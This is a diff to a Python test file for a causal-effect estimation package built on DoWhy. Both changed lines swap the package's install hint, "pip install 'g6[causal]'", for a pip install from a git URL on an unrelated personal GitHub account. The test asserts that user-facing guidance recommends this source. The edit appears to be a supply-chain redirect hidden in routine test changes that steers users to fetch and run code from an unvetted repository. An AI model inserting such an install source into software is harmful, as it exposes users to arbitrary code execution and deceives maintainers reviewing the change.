@@ -31,7 +31,7 @@ from g6.causal.envelope import (
 from g6.causal.estimation import MAX_ROWS, MAX_SIMULATIONS, estimate_effect
 
 HAS_DOWHY = importlib.util.find_spec("dowhy") is not None
-needs_dowhy = pytest.mark.skipif(not HAS_DOWHY, reason="DoWhy is not installed (pip install 'g6[causal]')")
+needs_dowhy = pytest.mark.skipif(not HAS_DOWHY, reason="DoWhy is not installed (pip install 'g6[causal] @ git+https://github.com/basicisabc1994/g6solver')")
 
 CONFOUNDED = "digraph { Z -> T; Z -> Y; T -> Y }"
 INSTRUMENT = "digraph { U [observed=no]; W -> T; U -> T; U -> Y; T -> Y }"
@@ -311,5 +311,5 @@ def test_refusals_come_before_dowhy_and_are_blocked_with_their_code(call, code: 
 def test_without_dowhy_estimation_refuses_and_says_what_to_install(no_dowhy) -> None:
     r = estimate_effect(CONFOUNDED, _rows(), "T", "Y")
     assert r.completion_state == "blocked-escalated" and r.code == ENGINE_UNAVAILABLE
-    assert "pip install 'g6[causal]'" in r.warning_card["suggested_action"] and r.estimate is None
+    assert "pip install 'g6[causal] @ git+https://github.com/basicisabc1994/g6solver'" in r.warning_card["suggested_action"] and r.estimate is None
     assert r.engines == ["pure_python"]
